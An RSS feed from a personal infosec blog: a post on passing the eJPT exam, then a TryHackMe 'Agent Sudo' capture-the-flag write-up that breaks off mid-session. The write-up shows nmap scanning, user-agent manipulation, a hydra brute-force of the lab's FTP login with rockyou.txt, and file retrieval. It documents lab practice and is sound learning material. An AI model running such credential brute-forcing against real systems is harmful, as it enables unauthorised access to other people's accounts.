<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on Hi, I&#39;m Rob.</title>
        <link>https://robscharf.github.io/posts/</link>
        <description>Recent content in Posts on Hi, I&#39;m Rob.</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
        <lastBuildDate>Mon, 20 Jun 2022 11:14:00 +0000</lastBuildDate>
        <atom:link href="https://robscharf.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>I passed my eJPT!</title>
            <link>https://robscharf.github.io/posts/2022/06/i-passed-my-ejpt/</link>
            <pubDate>Mon, 20 Jun 2022 11:14:00 +0000</pubDate>
            
            <guid>https://robscharf.github.io/posts/2022/06/i-passed-my-ejpt/</guid>
            <description>I am pleased to share that I recently passed the eLearnSecurity Junior Penetration Tester certification exam on June 16!
The Exam According to INE&amp;rsquo;s website:
The eJPT is a three day, 20 question exam, that focuses on challenging you to prove your skillset in penetration testing foundations including programming, networking vulnerabilities, web attack vectors, and a host of other entry level skills&amp;hellip; Covering a host of skills which include entry level web penetration techniques, the eJPT provides you with the confidence and knowledge to begin training for more advanced penetration techniques and specialities.</description>
            <content type="html"><![CDATA[<p>I am pleased to share that I recently passed the <a href="https://elearnsecurity.com/product/ejpt-certification/">eLearnSecurity Junior Penetration Tester</a> certification exam on June 16!</p>
<br/>
<center>
<img src="/images/ejpt-cert.png" style="height:420px"> 
</center>
<h2 id="the-exam">The Exam</h2>
<p>According to <a href="https://ine.com/learning/certifications/internal/elearnsecurity-junior-penetration-tester">INE&rsquo;s website</a>:</p>
<blockquote>
<p>The eJPT is a three day, 20 question exam, that focuses on challenging you to prove your skillset in penetration testing foundations including programming, networking vulnerabilities, web attack vectors, and a host of other entry level skills&hellip; Covering a host of skills which include entry level web penetration techniques, the eJPT provides you with the confidence and knowledge to begin training for more advanced penetration techniques and specialities.</p>
</blockquote>
<h2 id="my-experience">My Experience</h2>
<p>There are thousands of reviews and suggested study guides for the eJPT on the internet. Thus, I will not try to reinvent any wheels with this post.</p>
<h3 id="preparation">Preparation</h3>
<p>Before taking the exam, I spent about 3 weeks with INE&rsquo;s Penetration Testing Student learning path (read: online course).</p>
<p>From my perspective and level of experience, the course material largely fell into four buckets:</p>
<ol>
<li>Introductory materials for elementary penetration testing tasks and concepts, such as computer networking, HTTP protocol basics, scripting with common languages like C++, Python, and Bash, as well as the use of basic tools like Burp Suite, Nmap, John the Ripper, and the Metasploit framework</li>
<li>The use of other, broadly outdated, tools<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup></li>
<li>Review of concepts and techniques I have previously learned (or been introduced to) via TryHackMe<sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup> and/or miscellanious YouTube videos, blog posts, etc.</li>
<li>Networking</li>
</ol>
<p>I emphasize #4 here, as, previous to my eJPT preparations, I had only engaged with network routing and live host discovery in theoretical/conceptual terms. I have not yet made my way through any of the TryHackMe network-based rooms, such as <a href="https://tryhackme.com/room/wreath">Wreath</a> or <a href="https://tryhackme.com/network/throwback">Throwback</a>.</p>
<p>Unfortunately, I wasn&rsquo;t able to access the preparatory &ldquo;eJPT Exam Preparation&rdquo; module (1 of 4 in the course), which, ostensibly, contains opportunities to practice network enumeration. According to this <a href="https://ine.com/blog/message-from-ine-ceo">Message from the INE CEO</a>, the company has encountered significant unforseen issues with migrating eLS&rsquo; previously VPN-based labs to the browser-based INE teaching platform. While I don&rsquo;t think this is particularly egregious in and of itself, the timing was certainly unfortunate for me.</p>
<p>Indeed, I was only able to practice my network discovery and routing through the &ldquo;Black-box Penetration Test 1&rdquo; box at the end of the Penetration Testing Basics module. &ldquo;Black-box Penetration Test&rdquo; boxes 2 and 3, unfortunately, do not involve &ldquo;secret&rdquo; servers, but pre-identified and directly accessible hosts.</p>
<h3 id="handy-resources">Handy Resources</h3>
<p>In addition to a smattering of reddit posts and similar incidental resources, I found the following guiding materials to be helpful in preparing for my exam:</p>
<ul>
<li><a href="https://kentosec.com/2019/08/04/how-to-pass-the-ejpt/">KentoSec - How to Pass the eJPT</a></li>
<li><a href="https://github.com/fdicarlo/eJPT">fdicarlo - eJPT</a></li>
<li><a href="https://jarrodrizor.com/ejpt-guide/">Jarrod Rizor&rsquo;s eJPT Guide</a></li>
<li><a href="https://github.com/grumpzsux/eJPT-Notes">grumpzsux&rsquo;s eJPT Notes 2022</a></li>
<li><a href="https://github.com/tejasanerao/eJPT-Cheatsheet">tejasanerao&rsquo;s eJPT-Cheatsheet</a></li>
</ul>
<p><strong>Note:</strong> There is an enormous amount of overlap between each of these resources! Please don&rsquo;t feel like it is necessary to engage with all of them.</p>
<h3 id="exam-impressions">Exam Impressions</h3>
<p>All-in-all, I felt that the INE/eLS course and certification exam was an enjoyable and rewarding process. The exam, particularly, was fun and excellent preliminary preparation for future black-box exam scenarios, from both a methodological and emotional point of view.</p>
<p>With only approximately 3 months of experience in infosec, offensive security, and cybersecurity more broadly, I was able to complete the exam in approximately 9 hours. After approximately 6 hours, I had secured enough points to pass the exam, though I wanted to take the opportunity to use the extensive (compared to what I am used to!) exam network and complete the remaining tasks that involved my weaker subject-areas, such as Windows host exploitation.</p>
<div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p>This distinction is made with the knowledge that eLS/INE are <a href="https://ine.com/blog/new-ejpt-coming-soon?utm%5C_source=linkedin&amp;utm%5C_medium=organic&amp;utm%5C_campaign=NeweJPTComingSoon&amp;utm%5C_content=blog">currently working on rolling out the eJPTv2</a>. The INE course for the new exam, <a href="https://my.ine.com/CyberSecurity/learning-paths/61f88d91-79ff-4d8f-af68-873883dbbd8c/penetration-testing-student-v2">Penetration Testing Student v2</a>, appears to have a significantly updated curriculum.&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:2">
<p>Relative to other platforms/courses, I have completed a relatively high number of THM rooms over the past two months. At the time of writing, I have completed 106 Rooms and have rank 11134. You can follow along with my progress by clicking <a href="https://tryhackme.com/p/robscharf">here</a>.&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>
]]></content>
        </item>
        
        <item>
            <title>THM: Agent Sudo -- Write-Up</title>
            <link>https://robscharf.github.io/posts/2022/05/thm-agent-sudo--write-up/</link>
            <pubDate>Mon, 23 May 2022 14:14:00 +0000</pubDate>
            
            <guid>https://robscharf.github.io/posts/2022/05/thm-agent-sudo--write-up/</guid>
            <description>About TryHackMe.com&amp;rsquo;s Agent Sudo is a beginner-friendly capture-the-flag virtual machine by DesKel. Agent Sudo has a secret agent theme and challenges users to capture two flags and gain root access by locating and decrypting a series of confidential communications.
Note I have replaced all instances of the virtual machine&amp;rsquo;s ip address with &amp;lt;target-ip&amp;gt; throughout this write-up.
Methodology We begin our enumeration efforts by running an nmap scan on the target machine to understand the ports that are open to network traffic.</description>
            <content type="html"><![CDATA[<h2 id="about">About</h2>
<p><a href="https://tryhackme.com/">TryHackMe.com</a>&rsquo;s <a href="https://tryhackme.com/room/agentsudoctf">Agent Sudo</a> is a beginner-friendly capture-the-flag virtual machine by <a href="https://tryhackme.com/p/DesKel">DesKel</a>. Agent Sudo has a secret agent theme and challenges users to capture two flags and gain root access by locating and decrypting a series of confidential communications.</p>
<h3 id="note">Note</h3>
<p>I have replaced all instances of the virtual machine&rsquo;s ip address with <code>&lt;target-ip&gt;</code> throughout this write-up.</p>
<h2 id="methodology">Methodology</h2>
<p>We begin our enumeration efforts by running an <code>nmap</code> scan on the target machine to understand the ports that are open to network traffic. I start with the <code>-V</code>, <code>-C</code>, and <code>-T4</code> flags.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Nmap 7.92 scan initiated Mon May 23 09:23:53 2022 as: nmap -sVC -T4 -o initial-svc-nmap.out 10.10.166.253</span>
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.166.253
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.13s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">997</span> closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">21/tcp open  ftp     vsftpd 3.0.3
</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 <span class="o">(</span>RSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea <span class="o">(</span>ECDSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 <span class="o">(</span>ED25519<span class="o">)</span>
</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Annoucement
</span></span><span class="line"><span class="cl">Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl"><span class="c1"># Nmap done at Mon May 23 09:24:05 2022 -- 1 IP address (1 host up) scanned in 12.65 seconds</span>
</span></span></code></pre></div><p>Now we know that the target is running <code>vsftpd 3.0.3</code> on <code>port 21</code>, <code>OpenSSH 7.6p1</code> on <code>port 22</code>, and an <code>Apache httpd 2.4.29</code> web server on <code>port 80</code> with the <code>http-title</code> of <code>announcement</code> - all open to <code>tcp</code> traffic.</p>
<p>Next, we visit the web server in a web browser.</p>
<p><code>/index.html</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DocType html&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">	<span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Annoucement<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">	Dear agents,
</span></span><span class="line"><span class="cl">	<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">	Use your own <span class="p">&lt;</span><span class="nt">b</span><span class="p">&gt;</span>codename<span class="p">&lt;/</span><span class="nt">b</span><span class="p">&gt;</span> as user-agent to access the site.
</span></span><span class="line"><span class="cl">	<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">	From,<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">	Agent R
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>We&rsquo;re greeted with a message from Agent R, instructing other agents to change their <code>user-agent</code> to thier codename for site access. Here I used <a href="https://addons.mozilla.org/en-US/firefox/addon/uaswitcher/">User-Agent Switcher</a> to alter my requests. I began by trying to log in as the boss, chaning my user agent to &ldquo;R&rdquo;. Unfortunately, we&rsquo;re given a hostile response by the administrator (presumably R himself) for this request:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>   
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>What are you doing! Are you one of the 25 employees? If not, I going to report this incident
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Annoucement<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">	Dear agents,
</span></span><span class="line"><span class="cl">	<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">	Use your own <span class="p">&lt;</span><span class="nt">b</span><span class="p">&gt;</span>codename<span class="p">&lt;/</span><span class="nt">b</span><span class="p">&gt;</span> as user-agent to access the site.
</span></span><span class="line"><span class="cl">	<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">	From,<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">	Agent R
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>Likewise, user-agents <code>A</code> and <code>B</code> do not work, but <code>C</code> redirects us to <code>/agent_C_attention.php</code> on the web site:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">Attention ----s, <span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">From,<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">Agent R
</span></span></code></pre></div><p>Out of curiosity, I tried <code>J</code> as a user-agent, but that did not yield anything. However, now that we know about a user named <code>----s</code>, we should see if we can access the vsftpd FTP server on port 21. I chose to use <code>hydra</code> to attempt to brute force the server. This process went extremely slowly, unfortunately, with several disconnections from the remote host. I assume that this has to do with some form of rate limiting.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>virtualtack㉿kali-bot<span class="o">)</span>-<span class="o">[</span>~/thm/agent-sudo<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ hydra -t <span class="m">1</span> -l ----s -P /usr/share/wordlists/rockyou.txt -vV 10.10.73.189 ftp
</span></span><span class="line"><span class="cl">Hydra v9.3 <span class="o">(</span>c<span class="o">)</span> <span class="m">2022</span> by van Hauser/THC <span class="p">&amp;</span> David Maciejak - Please <span class="k">do</span> not use in military or secret service organizations, or <span class="k">for</span> illegal purposes <span class="o">(</span>this is non-binding, these *** ignore laws and ethics anyway<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> starting at 2022-05-23 10:19:49
</span></span><span class="line"><span class="cl"><span class="o">[</span>DATA<span class="o">]</span> max <span class="m">1</span> task per <span class="m">1</span> server, overall <span class="m">1</span> task, <span class="m">14344399</span> login tries <span class="o">(</span>l:1/p:14344399<span class="o">)</span>, ~14344399 tries per task
</span></span><span class="line"><span class="cl"><span class="o">[</span>DATA<span class="o">]</span> attacking ftp://10.10.73.189:21/
</span></span><span class="line"><span class="cl"><span class="o">[</span>VERBOSE<span class="o">]</span> Resolving addresses ... <span class="o">[</span>VERBOSE<span class="o">]</span> resolving <span class="k">done</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>ATTEMPT<span class="o">]</span> target 10.10.73.189 - login <span class="s2">&#34;----s&#34;</span> - pass <span class="s2">&#34;123456&#34;</span> - <span class="m">1</span> of <span class="m">14344399</span> <span class="o">[</span>child 0<span class="o">]</span> <span class="o">(</span>0/0<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>ATTEMPT<span class="o">]</span> target 10.10.73.189 - login <span class="s2">&#34;----s&#34;</span> - pass <span class="s2">&#34;12345&#34;</span> - <span class="m">2</span> of <span class="m">14344400</span> <span class="o">[</span>child 0<span class="o">]</span> <span class="o">(</span>0/1<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>STATUS<span class="o">]</span> 2.00 tries/min, <span class="m">2</span> tries in 00:01h, <span class="m">14344398</span> to <span class="k">do</span> in 119536:40h, <span class="m">1</span> active
</span></span><span class="line"><span class="cl"><span class="o">[</span>ATTEMPT<span class="o">]</span> target 10.10.73.189 - login <span class="s2">&#34;----s&#34;</span> - pass <span class="s2">&#34;123456789&#34;</span> - <span class="m">3</span> of <span class="m">14344401</span> <span class="o">[</span>child 0<span class="o">]</span> <span class="o">(</span>0/2<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>ATTEMPT<span class="o">]</span> target 10.10.73.189 - login <span class="s2">&#34;----s&#34;</span> - pass <span class="s2">&#34;password&#34;</span> - <span class="m">4</span> of <span class="m">14344401</span> <span class="o">[</span>child 0<span class="o">]</span> <span class="o">(</span>0/2<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>ATTEMPT<span class="o">]</span> target 10.10.73.189 - login <span class="s2">&#34;----s&#34;</span> - pass <span class="s2">&#34;iloveyou&#34;</span> - <span class="m">5</span> of <span class="m">14344401</span> <span class="o">[</span>child 0<span class="o">]</span> <span class="o">(</span>0/2<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>ATTEMPT<span class="o">]</span> target 10.10.73.189 - login <span class="s2">&#34;----s&#34;</span> - pass <span class="s2">&#34;princess&#34;</span> - <span class="m">6</span> of <span class="m">14344401</span> <span class="o">[</span>child 0<span class="o">]</span> <span class="o">(</span>0/2<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>ATTEMPT<span class="o">]</span> target 10.10.73.189 - login <span class="s2">&#34;----s&#34;</span> - pass <span class="s2">&#34;1234567&#34;</span> - <span class="m">7</span> of <span class="m">14344401</span> <span class="o">[</span>child 0<span class="o">]</span> <span class="o">(</span>0/2<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">... 🕒 two hours later 🕒 ...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>ATTEMPT<span class="o">]</span> target 10.10.73.189 - login <span class="s2">&#34;----s&#34;</span> - pass <span class="s2">&#34;cutie&#34;</span> - <span class="m">243</span> of <span class="m">14344401</span> <span class="o">[</span>child 0<span class="o">]</span> <span class="o">(</span>0/2<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>ATTEMPT<span class="o">]</span> target 10.10.73.189 - login <span class="s2">&#34;----s&#34;</span> - pass <span class="s2">&#34;james&#34;</span> - <span class="m">244</span> of <span class="m">14344401</span> <span class="o">[</span>child 0<span class="o">]</span> <span class="o">(</span>0/2<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>ATTEMPT<span class="o">]</span> target 10.10.73.189 - login <span class="s2">&#34;----s&#34;</span> - pass <span class="s2">&#34;banana&#34;</span> - <span class="m">245</span> of <span class="m">14344401</span> <span class="o">[</span>child 0<span class="o">]</span> <span class="o">(</span>0/2<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>ATTEMPT<span class="o">]</span> target 10.10.73.189 - login <span class="s2">&#34;----s&#34;</span> - pass <span class="s2">&#34;prince&#34;</span> - <span class="m">246</span> of <span class="m">14344401</span> <span class="o">[</span>child 0<span class="o">]</span> <span class="o">(</span>0/2<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>STATUS<span class="o">]</span> 7.94 tries/min, <span class="m">246</span> tries in 00:31h, <span class="m">14344155</span> to <span class="k">do</span> in 30126:37h, <span class="m">1</span> active
</span></span><span class="line"><span class="cl"><span class="o">[</span>ATTEMPT<span class="o">]</span> target 10.10.73.189 - login <span class="s2">&#34;----s&#34;</span> - pass <span class="s2">&#34;friend&#34;</span> - <span class="m">247</span> of <span class="m">14344401</span> <span class="o">[</span>child 0<span class="o">]</span> <span class="o">(</span>0/2<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>ATTEMPT<span class="o">]</span> target 10.10.73.189 - login <span class="s2">&#34;----s&#34;</span> - pass <span class="s2">&#34;jesus1&#34;</span> - <span class="m">248</span> of <span class="m">14344401</span> <span class="o">[</span>child 0<span class="o">]</span> <span class="o">(</span>0/2<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>ATTEMPT<span class="o">]</span> target 10.10.73.189 - login <span class="s2">&#34;----s&#34;</span> - pass <span class="s2">&#34;------l&#34;</span> - <span class="m">249</span> of <span class="m">14344401</span> <span class="o">[</span>child 0<span class="o">]</span> <span class="o">(</span>0/2<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>21<span class="o">][</span>ftp<span class="o">]</span> host: 10.10.73.189   login: ----s   password: ------l
</span></span><span class="line"><span class="cl"><span class="o">[</span>STATUS<span class="o">]</span> attack finished <span class="k">for</span> 10.10.73.189 <span class="o">(</span>waiting <span class="k">for</span> children to <span class="nb">complete</span> tests<span class="o">)</span>
</span></span></code></pre></div><p>We test out our new credentials and discover three files on the FTP server that we can get. We download the text message first.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>virtualtack㉿kali-bot<span class="o">)</span>-<span class="o">[</span>~/thm/agent-sudo<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ ftp 10.10.73.189 
</span></span><span class="line"><span class="cl">Connected to 10.10.73.189.
</span></span><span class="line"><span class="cl"><span class="m">220</span> <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
</span></span><span class="line"><span class="cl">Name <span class="o">(</span>10.10.73.189:virtualtack<span class="o">)</span>: ----s
</span></span><span class="line"><span class="cl"><span class="m">331</span> Please specify the password.
</span></span><span class="line"><span class="cl">Password: 
</span></span><span class="line"><span class="cl"><span class="m">230</span> Login successful.
</span></span><span class="line"><span class="cl">Remote system <span class="nb">type</span> is UNIX.
</span></span><span class="line"><span class="cl">Using binary mode to transfer files.
</span></span><span class="line"><span class="cl">ftp&gt; ls
</span></span><span class="line"><span class="cl"><span class="m">229</span> Entering Extended Passive Mode <span class="o">(||</span><span class="p">|</span>20720<span class="p">|</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="m">150</span> Here comes the directory listing.
</span></span><span class="line"><span class="cl">-rw-r--r--    <span class="m">1</span> <span class="m">0</span>        <span class="m">0</span>             <span class="m">217</span> Oct <span class="m">29</span>  <span class="m">2019</span> To_agentJ.txt
</span></span><span class="line"><span class="cl">-rw-r--r--    <span class="m">1</span> <span class="m">0</span>        <span class="m">0</span>           <span class="m">33143</span> Oct <span class="m">29</span>  <span class="m">2019</span> cute-alien.jpg
</span></span><span class="line"><span class="cl">-rw-r--r--    <span class="m">1</span> <span class="m">0</span>        <span class="m">0</span>           <span class="m">34842</span> Oct <span class="m">29</span>  <span class="m">2019</span> cutie.png
</span></span><span class="line"><span class="cl"><span class="m">226</span> Directory send OK.
</span></span><span class="line"><span class="cl">ftp&gt; get To_agentJ.txt
</span></span><span class="line"><span class="cl">local: To_agentJ.txt remote: To_agentJ.txt
</span></span><span class="line"><span class="cl"><span class="m">229</span> Entering Extended Passive Mode <span class="o">(||</span><span class="p">|</span>35196<span class="p">|</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="m">150</span> Opening BINARY mode data connection <span class="k">for</span> To_agentJ.txt <span class="o">(</span><span class="m">217</span> bytes<span class="o">)</span>.
</span></span><span class="line"><span class="cl">100% <span class="p">|</span>************<span class="p">|</span>   <span class="m">217</span>       75.79 KiB/s    00:00 ETA
</span></span><span class="line"><span class="cl"><span class="m">226</span> Transfer complete.
</span></span><span class="line"><span class="cl"><span class="m">217</span> bytes received in 00:00 <span class="o">(</span>1.69 KiB/s<span class="o">)</span>
</span></span><span class="line"><span class="cl">ftp&gt; <span class="nb">exit</span>
</span></span><span class="line"><span class="cl"><span class="m">221</span> Goodbye.                                                    
</span></span></code></pre></div><p><code>To_agentJ.txt</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">Dear agent J,
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn<span class="err">&#39;</span>t be a problem <span class="k">for</span> you.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">From,
</span></span><span class="line"><span class="cl">Agent C
</span></span></code></pre></div><p>Good to know! Let&rsquo;s grab the image files and figure out how to extract Agent J&rsquo;s login password.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>virtualtack㉿kali-bot<span class="o">)</span>-<span class="o">[</span>~/thm/agent-sudo<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ ftp 10.10.73.189 
</span></span><span class="line"><span class="cl">Connected to 10.10.73.189.
</span></span><span class="line"><span class="cl"><span class="m">220</span> <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
</span></span><span class="line"><span class="cl">Name <span class="o">(</span>10.10.73.189:virtualtack<span class="o">)</span>: ----s
</span></span><span class="line"><span class="cl"><span class="m">331</span> Please specify the password.
</span></span><span class="line"><span class="cl">Password: 
</span></span><span class="line"><span class="cl"><span class="m">230</span> Login successful.
</span></span><span class="line"><span class="cl">Remote system <span class="nb">type</span> is UNIX.
</span></span><span class="line"><span class="cl">Using binary mode to transfer files.
</span></span><span class="line"><span class="cl">ftp&gt; ls
</span></span><span class="line"><span class="cl"><span class="m">229</span> Entering Extended Passive Mode <span class="o">(||</span><span class="p">|</span>27749<span class="p">|</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="m">150</span> Here comes the directory listing.
</span></span><span class="line"><span class="cl">-rw-r--r--    <span class="m">1</span> <span class="m">0</span>        <span class="m">0</span>             <span class="m">217</span> Oct <span class="m">29</span>  <span class="m">2019</span> To_agentJ.txt
</span></span><span class="line"><span class="cl">-rw-r--r--    <span class="m">1</span> <span class="m">0</span>        <span class="m">0</span>           <span class="m">33143</span> Oct <span class="m">29</span>  <span class="m">2019</span> cute-alien.jpg
</span></span><span class="line"><span class="cl">-rw-r--r--    <span class="m">1</span> <span class="m">0</span>        <span class="m">0</span>           <span class="m">34842</span> Oct <span class="m">29</span>  <span class="m">2019</span> cutie.png
</span></span><span class="line"><span class="cl"><span class="m">226</span> Directory send OK.
</span></span><span class="line"><span class="cl">ftp&gt; get cute-alien.jpg
</span></span><span class="line"><span class="cl">local: cute-alien.jpg remote: cute-alien.jpg
</span></span><span class="line"><span class="cl"><span class="m">229</span> Entering Extended Passive Mode <span class="o">(||</span><span class="p">|</span>13011<span class="p">|</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="m">150</span> Opening BINARY mode data connection <span class="k">for</span> cute-alien.jpg <span class="o">(</span><span class="m">33143</span> bytes<span class="o">)</span>.
</span></span><span class="line"><span class="cl">100% <span class="p">|</span>************<span class="p">|</span> <span class="m">33143</span>      308.57 KiB/s    00:00 ETA
</span></span><span class="line"><span class="cl"><span class="m">226</span> Transfer complete.
